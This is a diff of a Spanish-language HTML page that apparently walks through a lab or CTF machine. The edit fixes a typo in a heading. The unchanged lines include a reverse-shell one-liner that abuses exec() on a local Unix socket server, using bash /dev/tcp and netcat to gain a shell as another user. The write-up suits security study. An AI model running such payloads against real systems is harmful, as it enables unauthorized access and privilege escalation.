@@ -88,7 +88,7 @@ https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell
 <li>except: break: Si ocurre un error grave en el servidor, sale del bucle principal.</li>
 <li>server.close(): Cierra el servidor y libera el socket cuando termina su ejecución.</li>
 
-<h2>Aprovecharemos el uso del sockey y de exec() para ejecutar comandos y ganar una reverse shell</h2>
+<h2>Aprovecharemos el uso del socket y de exec() para ejecutar comandos y ganar una reverse shell</h2>
 <h2>echo 'import subprocess; raise Exception(subprocess.check_output("bash -c \"bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\"", shell=True, stderr=subprocess.STDOUT).decode())' | nc -U /tmp/dev.sock</h2>
 
 <h2>Ejecutamos y nos ponemos en escucha mediante Netcat y listo ahora somos el usuario Juan</h2>
